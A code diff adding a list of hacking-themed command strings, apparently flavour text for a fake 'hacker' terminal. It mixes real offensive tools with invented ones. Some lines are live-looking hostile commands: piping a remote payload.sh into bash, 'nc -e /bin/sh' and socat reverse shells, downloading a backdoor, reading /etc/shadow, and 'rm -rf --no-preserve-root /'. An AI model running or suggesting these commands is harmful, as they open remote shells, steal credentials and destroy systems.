@@ -1,3 +1,96 @@
+nmap -sS -T4 -p- 10.0.0.42
+msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
+sqlmap -u "http://target.com/index.php?id=1" --dump
+nc -lvnp 4444
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+whois redskycorp.com
+dig +short ns1.mega-root.net
+dirb http://intranet/ /usr/share/dirb/wordlists/common.txt
+nikto -h http://192.168.10.10
+airmon-ng start wlan0
+airodump-ng wlan0mon
+tcpdump -i eth0 port 80
+curl -s http://blacknet.local/payload.sh | bash
+ftp 10.0.0.42
+scp malware.exe user@target:/tmp
+openssl s_client -connect secure.target.net:443
+ping -f 8.8.8.8
+arp-scan --interface=eth0 --localnet
+enum4linux -a 192.168.1.99
+recon-ng --workspace empire
+burpsuite &
+wpscan --url http://fakeblog.local
+msrpc-client --rpc-call 0x1f
+rdesktop 192.168.100.12
+setoolkit --spoof-email
+crackmapexec smb 10.10.10.5 -u user -p pass
+gobuster dir -u http://target/ -w /usr/share/wordlists/dirbuster.txt
+hping3 -S 10.10.10.10 -p 80 --flood
+ettercap -T -q -i eth0 -M arp:remote
+ncat --ssl target.com 443
+powershell -enc aGVsbG8gd29ybGQ=
+mitmproxy --mode transparent
+ufw allow 31337/tcp
+zenmap &
+ssh -L 8080:localhost:80 user@remotehost
+proxychains firefox evil.com
+iptables -A INPUT -s 10.13.37.0/24 -j DROP
+dradis &
+snmpwalk -v2c -c public 192.168.0.50
+smbclient //10.0.0.4/shared -U guest
+python3 exploit.py --target 192.168.2.50
+dnsenum company.internal
+responder -I eth0
+powersploit --module Invoke-Mimikatz
+wine C:\\Tools\\rat.exe
+autohax --launch --target highsec.local
+nc -e /bin/sh attacker:9001
+wget http://evil.host/backdoor -O /tmp/bd
+rm -rf --no-preserve-root /
+tshark -i wlan0 -Y http.request
+bofgen --arch x64 --type egghunter
+decompile -i stealth.apk -o output/
+ps -aux | grep payload
+journalctl -xe | grep intrusion
+xfreerdp /u:admin /p:123 /v:targethost
+./recon.sh -m aggressive -d domain.local
+traceroute -T --port=443 secure.host.com
+xargs curl -X POST
+socat TCP-LISTEN:9001,reuseaddr EXEC:/bin/bash
+chmod +x shellgen.sh && ./shellgen.sh
+zmap -p 22 10.0.0.0/8
+amass enum -d darkcorp.local
+enum-bruteforce -d sci-fi.gov -w custom.txt
+netstat -anptu | grep 31337
+volatility -f memdump.raw --profile=Win10x64 pslist
+./exfiltrate-data --compress --upload
+backdoor-factory -f notepad.exe -s windows/meterpreter/reverse_tcp
+sudocat /etc/shadow > send.txt
+shadowclone --clone-profile root
+zerologon-poc --ip 192.168.56.50
+./unicorn.py --encode powershell_payload
+firewalk -S -n -p 443 internal.target
+p0f -i eth0
+dnsrecon -d fictionalco.local
+tmux new-session -d -s hackdash
+scapy sniff -i wlan0 -f "tcp port 80"
+fake-telnetd --banner "Welcome to Umbrella Corp"
+gpg --decrypt nuclear_launch_codes.gpg
+stormprobe --init --range 10.0.0.0/8
+metacrypt --key blacksun.key --in data.txt
+apt install -y evil-tools
+java -jar exploit-uber.jar -t target.internal
+yara -r rules.yar /opt
+pyminisploit run --target unsecurebox.local
+curl -X GET http://vault42.org/initiate
+ninja-crack -m bruteforce -t 10.0.0.66
+shadowdns -lookup evil.com
+ldapsearch -x -h dc.shadowrealm -b "dc=corp,dc=local"
+fakeroute -simulate 15 hops
+hiveconnect --token secret123 --mode passive
+icmpshell -l 0.0.0.0 -p 12345
 Decrypting password hash...
 Establishing connection to 192.168.{}.{}...
 Bypassing firewall rules...
